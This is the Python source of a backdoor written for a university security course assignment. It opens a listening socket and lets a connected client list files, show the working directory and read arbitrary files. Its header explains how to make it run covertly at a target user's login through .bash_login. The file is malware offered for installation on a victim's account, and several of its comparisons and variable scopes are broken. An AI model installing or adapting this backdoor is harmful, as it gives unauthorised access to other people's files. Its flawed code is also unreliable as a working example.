###
# CPSC 526 - Assignment 1
# Group: Justin Berry, Andrew Lata
# This is a Python program that is meant to run as a process on a target machine
# It grants an attacking user a backdoor, providing an attacker with access to 
# some terminal commands
#
# To install this script to a linux user's profile, add '/path/to/backdoor.py'
# to the .bash_login file in the target user's home folder. If the file does not 
# exist, you can create it.
###

#!/usr/bin/python

import socket
import getopt
import sys
import subprocess
import string

LISTEN = True
HOST = ''
PORT = 0
PWD = subprocess.check_output(['pwd'])


def start():
    global LISTEN
    global HOST
    global PORT
    global PWD

    # run in netcat listen mode (server).
    HOST = '127.0.0.1'
    PORT = 6666
    server_connector()
    PWD = subprocess.check_output(['pwd'])

def server_connector():
    # Create a simple waiting loop for clients to connect to
    # the server
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)  ## only need to allow 1 client connection
    print("Waiting for socket connection at " + HOST + ":" + str(PORT))

    while True:
        clientSocket, addr = server.accept()
        print("NC Client has connected via" + addr[0] + ":" + str(addr[1]))
        clientSocket.send(bytearray("Welcome to 6666 backdoor: \n","utf-8"))
        server_listener(clientSocket,server)


## this function deals with netcat commands from client connection
def server_listener(clientSocket,server):
    while True:
        clientSocket.send(bytearray("\n$","utf-8"))
        bashCommand = ''
        while "\n" not in bashCommand:
            bashCommand = clientSocket.recv(1024).decode()
        bashCommand = bashCommand.rstrip()
        bash_args = bashCommand.split(' ')
        #print("Client Entered: " + bashCommand)

        if ('pwd' in bashCommand):
            #out_bytes = subproess.check_output(['cmd','arg1','arg2'])
            output = PWD
#            print("rfind: %i", output.decode().rindex('/'))
        elif (bash_args[0] is "cd"):
            if (bash_args[1] is ".."):
                last = PWD.decode().rindex('/')
                PWD = PWD[:last]
            else:
                PWD = PWD + bash_args[1]
                print(PWD)
        elif ('ls' in bashCommand):
            output = subprocess.check_output(['ls'])

        elif ( ('cat' in bashCommand ) & ( len(bash_args) == 2) ):
            try:
                print(bash_args[1])
                buffer = ""
                buffer += open(bash_args[1]).read()
                output = buffer.encode()
            except:
                output = "file doesn't exist\nusage: $cat <filename>\n"
                output = output.encode()

        elif bashCommand == 'off':
            server.shutdown(1)
            server.close()
            sys.exit()

        else:
            output = "Not a valid bash command \n".encode()

        clientSocket.send(output)


if __name__ == '__main__':
    start()








